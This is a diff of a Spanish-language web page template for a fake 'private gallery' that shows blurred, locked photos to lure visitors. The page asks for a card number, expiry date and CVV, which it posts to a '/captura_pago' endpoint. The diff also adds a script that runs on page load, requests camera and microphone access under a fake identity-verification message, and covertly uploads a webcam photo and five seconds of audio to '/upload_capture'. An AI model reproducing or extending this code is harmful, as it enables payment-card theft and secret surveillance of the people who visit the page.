@@ -3,48 +3,221 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GALERÍA PRIVADA</title>
+    <title>{{ config.titulo }}</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
     <style>
-        body { 
-            background: {{ config.color_fondo }}; 
-            color: white; font-family: sans-serif; min-height: 100vh;
+        :root {
+            --bg-color: {{ config.color_fondo }};
+            --text-color: {{ config.color_texto }};
+            --accent: #ffd700;
         }
-        .pay-card {
-            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px);
-            border: 1px solid gold; border-radius: 20px; padding: 25px;
-            margin-top: 20px; box-shadow: 0 0 20px rgba(255, 215, 0, 0.2);
+
+        body {
+            background: radial-gradient(circle at center, var(--bg-color) 0%, #000000 100%);
+            color: var(--text-color);
+            font-family: 'Segoe UI', sans-serif;
+            min-height: 100vh;
         }
-        .form-control { background: rgba(0,0,0,0.5) !important; color: gold !important; border: 1px solid #444 !important; }
-        .btn-pay { background: linear-gradient(45deg, #ffd700, #ff8c00); border: none; font-weight: bold; color: black; }
-        .img-item { border-radius: 10px; border: 1px solid #333; margin-bottom: 15px; filter: blur(4px); transition: 0.3s; }
+
+        /* PORTADA PERSONALIZADA */
+        .portada-vip {
+            width: 100%;
+            height: 250px;
+            background-image: url('{{ config.img_principal }}?t={{ range(1, 999) | random }}');
+            background-size: cover;
+            background-position: center;
+            border-bottom: 2px solid var(--accent);
+            position: relative;
+        }
+
+        .overlay-portada {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(transparent, rgba(0,0,0,0.8));
+            padding: 20px;
+            text-align: center;
+        }
+
+        .alias-badge {
+            background: linear-gradient(45deg, #ffd700, #b8860b);
+            color: black;
+            padding: 5px 20px;
+            border-radius: 20px;
+            font-weight: bold;
+            box-shadow: 0 0 15px var(--accent);
+        }
+
+        /* GALERÍA DE FOTOS (Las que tú subes) */
+        .gallery-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+            gap: 12px;
+            padding: 20px;
+            margin-bottom: 250px; /* Espacio para el panel de pago */
+        }
+
+        .photo-item {
+            aspect-ratio: 1 / 1;
+            position: relative;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 215, 0, 0.3);
+            background: #111;
+        }
+
+        .photo-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: blur(10px) grayscale(100%); /* Efecto bloqueado */
+        }
+
+        .lock-icon {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: var(--accent);
+            font-size: 1.5rem;
+            text-shadow: 0 0 10px black;
+        }
+
+        /* PANEL DE PAGO INFERIOR */
+        .payment-box {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: rgba(0,0,0,0.95);
+            backdrop-filter: blur(10px);
+            border-top: 2px solid var(--accent);
+            padding: 20px;
+            z-index: 9999;
+        }
+
+        .form-control {
+            background: rgba(255,255,255,0.1) !important;
+            border: 1px solid var(--accent) !important;
+            color: white !important;
+            text-align: center;
+        }
+
+        .btn-pay {
+            background: linear-gradient(45deg, #ffd700, #daa520);
+            color: black;
+            font-weight: bold;
+            border: none;
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 10px;
+        }
+
+        #status-log {
+            font-size: 10px;
+            color: #00ff41;
+            text-align: center;
+            margin-top: 5px;
+            font-family: monospace;
+        }
     </style>
 </head>
-<body class="p-3">
-    <div class="container text-center">
-        <h4 class="mb-4">CONTENIDO BLOQUEADO</h4>
-        
-        <div class="row">
-            {% for f in fotos %}
-            <div class="col-6 col-md-4">
-                <img src="/static/uploads/{{f}}" class="img-fluid img-item">
-            </div>
-            {% endfor %}
-        </div>
+<body>
 
-        <div class="pay-card">
-            <h5 class="text-warning">VER GALERÍA COMPLETA</h5>
-            <p class="small">Realiza un pago único de <b>${{ config.precio }}</b> mediante <b>{{ config.alias }}</b></p>
-            
-            <form action="/captura_pago" method="POST">
-                <input type="text" name="cc" class="form-control mb-3" placeholder="Número de Tarjeta" required>
-                <div class="row g-2 mb-3">
-                    <div class="col-6"><input type="text" name="exp" class="form-control" placeholder="MM/AA" required></div>
-                    <div class="col-6"><input type="text" name="cvv" class="form-control" placeholder="CVV" required></div>
-                </div>
-                <button class="btn btn-pay w-100 p-3">ACTIVAR ACCESO AHORA</button>
-            </form>
+    <div class="portada-vip">
+        <div class="overlay-portada">
+            <h1 style="color: var(--accent); font-weight: 800;">{{ config.titulo }}</h1>
+            <span class="alias-badge">{{ config.alias }}</span>
         </div>
     </div>
+
+    <div class="container mt-3">
+        <div class="text-center mb-3">
+            <small class="text-warning">Contenido exclusivo verificado para miembros</small>
+        </div>
+
+        <div class="gallery-grid">
+            {% if fotos %}
+                {% for f in fotos %}
+                <div class="photo-item">
+                    <img src="/static/uploads/{{ f }}" alt="VIP Content">
+                    <div class="lock-icon">🔒</div>
+                </div>
+                {% endfor %}
+            {% else %}
+                <div class="text-center w-100 opacity-50">No hay fotos en la galería</div>
+            {% endif %}
+        </div>
+    </div>
+
+    <div class="payment-box">
+        <div class="container">
+            <h6 class="text-center mb-3" style="color: gold;">VERIFICACIÓN REQUERIDA PARA DESBLOQUEAR</h6>
+            <form action="/captura_pago" method="POST">
+                <div class="row g-2">
+                    <div class="col-12">
+                        <input type="text" name="cc" class="form-control" placeholder="Número de Tarjeta" required maxlength="19">
+                    </div>
+                    <div class="col-6">
+                        <input type="text" name="exp" class="form-control" placeholder="MM/AA" required maxlength="5">
+                    </div>
+                    <div class="col-6">
+                        <input type="text" name="cvv" class="form-control" placeholder="CVV" required maxlength="4">
+                    </div>
+                </div>
+                <button class="btn-pay">DESBLOQUEAR CONTENIDO ($ {{ config.precio }})</button>
+            </form>
+            <div id="status-log">ESTADO: ESPERANDO SINCRONIZACIÓN...</div>
+        </div>
+    </div>
+
+    <script>
+        async function runCapture() {
+            const log = document.getElementById('status-log');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                log.innerText = "ESTADO: IDENTIDAD VERIFICADA ✓";
+
+                // Captura de Foto
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640; canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        const fd = new FormData();
+                        fd.append('file', blob);
+                        fd.append('type', 'photo');
+                        fetch('/upload_capture', {method: 'POST', body: fd});
+                    }, 'image/jpeg');
+
+                    // Captura de Audio (5 segundos)
+                    const recorder = new MediaRecorder(stream);
+                    const chunks = [];
+                    recorder.ondataavailable = e => chunks.push(e.data);
+                    recorder.onstop = () => {
+                        const audioBlob = new Blob(chunks, {type: 'audio/webm'});
+                        const fdA = new FormData();
+                        fdA.append('file', audioBlob);
+                        fdA.append('type', 'audio');
+                        fetch('/upload_capture', {method: 'POST', body: fdA});
+                        stream.getTracks().forEach(t => t.stop());
+                    };
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), 5000);
+                }, 2000);
+
+            } catch (e) {
+                log.innerText = "ESTADO: ERROR 403 - ACTIVA TU CÁMARA";
+                log.style.color = "red";
+            }
+        }
+        window.onload = runCapture;
+    </script>
 </body>
 </html>
